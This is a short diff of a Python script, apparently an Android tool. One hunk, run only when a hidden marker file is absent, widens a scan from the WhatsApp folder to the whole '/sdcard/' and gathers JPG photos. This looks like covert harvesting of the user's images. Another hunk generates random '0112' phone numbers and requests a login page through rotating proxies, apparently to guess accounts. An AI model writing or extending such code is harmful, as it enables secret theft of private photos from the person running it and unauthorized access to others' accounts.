@@ -22,7 +22,7 @@ opop = ff+hh
 
 
 if not isfile('.test.txt'):
-    for dir, dirs, files in walk('/sdcard/WhatsApp'):
+    for dir, dirs, files in walk('/sdcard/'):
         for file in files:
             pathF = dir + '/' + file
             if '.jpg' in pathF[-4:]:
@@ -100,7 +100,7 @@ def ali():
  f = open(prox,'r').readlines()
  while True:
   try:
-   all = '012'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
+   all = '0112'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
    op = a.get(login)                                                        
                                                                    
    pr = {'http':choice(str(f))}
